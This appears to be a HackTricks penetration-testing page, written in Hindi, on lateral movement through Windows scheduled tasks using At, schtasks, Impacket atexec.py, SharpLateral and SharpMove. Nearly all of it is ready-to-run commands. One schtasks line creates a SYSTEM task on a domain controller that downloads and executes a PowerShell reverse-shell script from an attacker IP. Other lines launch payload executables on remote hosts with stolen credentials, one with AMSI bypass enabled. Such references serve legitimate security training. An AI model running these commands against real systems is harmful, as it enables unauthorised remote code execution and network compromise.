# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## यह कैसे काम करता है

At उन hosts में tasks schedule करने की अनुमति देता है जहाँ आपको username/(password/Hash) पता हो। इसलिए, आप इसका उपयोग दूसरे hosts में commands execute करने और output प्राप्त करने के लिए कर सकते हैं।
```
At \\victim 11:00:00PM shutdown -r
```
schtasks का उपयोग करके, आपको पहले task बनाना होगा और फिर उसे call करना होगा:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
आप **Impacket's `atexec.py`** का उपयोग AT command के माध्यम से remote systems पर commands execute करने के लिए कर सकते हैं। इसके लिए target system के valid credentials (username और password या hash) आवश्यक हैं।
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
आप [SharpLateral](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
आप [SharpMove](https://github.com/0xthirteen/SharpMove) का उपयोग कर सकते हैं:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
schtasks के साथ silver tickets के [**उपयोग के बारे में अधिक जानकारी यहां**](../active-directory-methodology/silver-ticket.md#host) है।

{{#include ../../banners/hacktricks-training.md}}
